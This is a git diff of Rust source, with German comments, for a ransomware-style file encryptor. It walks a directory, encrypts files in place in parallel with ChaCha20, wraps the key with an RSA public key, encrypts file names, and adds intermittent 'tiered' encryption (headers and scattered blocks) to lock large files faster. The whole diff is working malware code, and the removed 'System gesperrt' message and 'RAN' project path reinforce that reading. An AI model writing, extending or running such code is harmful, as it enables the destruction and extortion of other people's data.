@@ -12,18 +12,21 @@ use walkdir::WalkDir;
 
 // --- KONSTANTEN ---
 const BUFFER_4MB: usize = 4 * 1024 * 1024;
+const BUFFER_1MB: usize = 1 * 1024 * 1024;
+const SMALL_FILE_THRESHOLD: u64 = 1 * 1024 * 1024; // < 1 MB
+const MEDIUM_FILE_THRESHOLD: u64 = 500 * 1024 * 1024; // < 500 MB
 const RECOVERY_FILE: &str = "INFO.bin";
+const SPARSE_BLOCKS: usize = 5; // Anzahl der zusätzlichen Blöcke bei großen Dateien
 
-// --- METADATEN STRUKTUR ---
 #[derive(serde::Serialize, serde::Deserialize)]
 struct RecoveryMetadata {
-    encrypted_master_key: Vec<u8>, // RSA-verschlüsselter ChaCha-Key
-    nonce_salt: [u8; 16],          // Salt für die Nonce-Berechnung
+    encrypted_master_key: Vec<u8>,
+    nonce_salt: [u8; 16],
     chunk_size: usize,
+    tiered_strategy: bool, // Für zukünftige Kompatibilität
 }
 
 impl RecoveryMetadata {
-    // Berechnet die Nonce basierend auf dem Original-Pfad (LaTeX: $Nonce = Hash(Path + Salt)$)
     fn derive_nonce(&self, master_key: &[u8; 32], original_path: &str) -> [u8; 12] {
         let mut hasher = Sha256::new();
         hasher.update(master_key);
@@ -36,34 +39,30 @@ impl RecoveryMetadata {
     }
 }
 
-// --- KERNFUNKTIONEN ---
-
 fn main() -> anyhow::Result<()> {
-    // 1. Initialisierung (In der Praxis via CLI-Args)
-    let target_dir = "/home/jannik/Cloud/Dev/RAN/enc/test_data"; // Beispiel: Zielverzeichnis
+    let target_dir = "/home/jannik/Cloud/Dev/RAN/enc/test_data";
     let dry_run = false;
     let pub_key_pem = fs::read_to_string("public.pem")?;
     let pub_key = RsaPublicKey::from_public_key_pem(&pub_key_pem)?;
 
-    // 2. Master-Key & Salt generieren
+    // Master-Key & Salt
     let mut master_key = [0u8; 32];
     let mut rng = thread_rng();
     rng.fill_bytes(&mut master_key);
     let mut salt = [0u8; 16];
     rng.fill_bytes(&mut salt);
 
-    // 3. Recovery-Metadaten vorbereiten
     let enc_key = pub_key.encrypt(&mut rng, Oaep::new::<Sha256>(), &master_key)?;
+
     let meta = RecoveryMetadata {
         encrypted_master_key: enc_key,
         nonce_salt: salt,
         chunk_size: BUFFER_4MB,
+        tiered_strategy: true,
     };
 
-    // 4. Den "Panic-Prozess" starten
-    println!("ACHTUNG: Verschlüsselung startet...");
+    println!("🚀 Verschlüsselung mit Tiered Strategy gestartet...");
 
-    // Wir sammeln erst alle Pfade, um die MFT-Belastung zu bündeln
     let entries: Vec<PathBuf> = WalkDir::new(target_dir)
         .into_iter()
         .filter_map(|e| e.ok())
@@ -71,52 +70,97 @@ fn main() -> anyhow::Result<()> {
         .map(|e| e.into_path())
         .collect();
 
-    // Parallele Verarbeitung mit Rayon
     entries.par_iter().for_each(|path| {
         if !dry_run {
             let _ = process_file(path, &master_key, &meta);
         }
     });
 
-    // 5. Recovery-Info speichern (Am besten auf den USB-Stick)
-    let mut serialized = Vec::new();
-    serialized.extend_from_slice(&(meta.encrypted_master_key.len() as u64).to_le_bytes());
-    serialized.extend_from_slice(&meta.encrypted_master_key);
-    serialized.extend_from_slice(&meta.nonce_salt);
-    serialized.extend_from_slice(&(meta.chunk_size as u64).to_le_bytes());
+    // Recovery Info speichern
+    let serialized = bincode::serialize(&meta)?;
     fs::write(RECOVERY_FILE, &serialized)?;
 
-    println!("System gesperrt.");
+    println!(
+        "✅ Verschlüsselung abgeschlossen. Recovery-Datei: {}",
+        RECOVERY_FILE
+    );
     Ok(())
 }
 
 fn process_file(path: &Path, master_key: &[u8; 32], meta: &RecoveryMetadata) -> anyhow::Result<()> {
-    let original_path_str = path.to_string_lossy();
+    let original_path_str = path.to_string_lossy().to_string();
     let nonce = meta.derive_nonce(master_key, &original_path_str);
     let mut cipher = ChaCha20::new(master_key.into(), &nonce.into());
 
-    // A: INHALT VERSCHLÜSSELN (In-Place)
-    encrypt_content(path, &mut cipher)?;
+    encrypt_content_tiered(path, &mut cipher)?;
 
-    // B: DATEINAME VERSCHLÜSSELN (Renaming) — use a separate nonce derived from the original path + "_name"
     rename_file(path, master_key, meta, &original_path_str)?;
 
     Ok(())
 }
 
-fn encrypt_content(path: &Path, cipher: &mut ChaCha20) -> anyhow::Result<()> {
+fn encrypt_content_tiered(path: &Path, cipher: &mut ChaCha20) -> anyhow::Result<()> {
     let mut file = OpenOptions::new().read(true).write(true).open(path)?;
     let size = file.metadata()?.len();
 
-    // Beispiel: Tiered Strategy (Nur Anfang verschlüsseln für Speed)
-    let to_read = std::cmp::min(size, BUFFER_4MB as u64);
-    let mut buffer = vec![0u8; to_read as usize];
+    match size {
+        s if s < SMALL_FILE_THRESHOLD => {
+            // Stufe 1: Kleine Dateien → Komplett verschlüsseln
+            encrypt_full(&mut file, size, cipher)?;
+        }
+        s if s < MEDIUM_FILE_THRESHOLD => {
+            // Stufe 2: Mittlere Dateien → Nur Header
+            encrypt_header(&mut file, cipher)?;
+        }
+        _ => {
+            // Stufe 3: Große Dateien → Sparse (Header + verteilte Blöcke)
+            encrypt_sparse(&mut file, size, cipher)?;
+        }
+    }
+    Ok(())
+}
 
+fn encrypt_full(file: &mut std::fs::File, size: u64, cipher: &mut ChaCha20) -> anyhow::Result<()> {
+    let mut buffer = vec![0u8; size as usize];
     file.read_exact(&mut buffer)?;
     cipher.apply_keystream(&mut buffer);
-
     file.seek(SeekFrom::Start(0))?;
     file.write_all(&buffer)?;
+    Ok(())
+}
+
+fn encrypt_header(file: &mut std::fs::File, cipher: &mut ChaCha20) -> anyhow::Result<()> {
+    let mut buffer = vec![0u8; BUFFER_4MB];
+    file.read_exact(&mut buffer)?;
+    cipher.apply_keystream(&mut buffer);
+    file.seek(SeekFrom::Start(0))?;
+    file.write_all(&buffer)?;
+    Ok(())
+}
+
+fn encrypt_sparse(
+    file: &mut std::fs::File,
+    size: u64,
+    cipher: &mut ChaCha20,
+) -> anyhow::Result<()> {
+    // Header
+    encrypt_header(file, cipher)?;
+
+    // Zusätzliche verteilte Blöcke
+    let step = size as usize / (SPARSE_BLOCKS + 1);
+    for i in 1..=SPARSE_BLOCKS {
+        let offset = (i * step) as u64;
+        if offset + BUFFER_1MB as u64 > size {
+            break;
+        }
+
+        file.seek(SeekFrom::Start(offset))?;
+        let mut buffer = vec![0u8; BUFFER_1MB];
+        file.read_exact(&mut buffer)?;
+        cipher.apply_keystream(&mut buffer);
+        file.seek(SeekFrom::Start(offset))?;
+        file.write_all(&buffer)?;
+    }
     Ok(())
 }
 
@@ -129,7 +173,6 @@ fn rename_file(
     let old_name = path.file_name().unwrap().to_string_lossy();
     let mut name_bytes = old_name.as_bytes().to_vec();
 
-    // Derive a separate nonce for filename encryption so decryption can reproduce it deterministically
     let parent = Path::new(original_path_str)
         .parent()
         .map(|p| p.to_string_lossy().to_string())
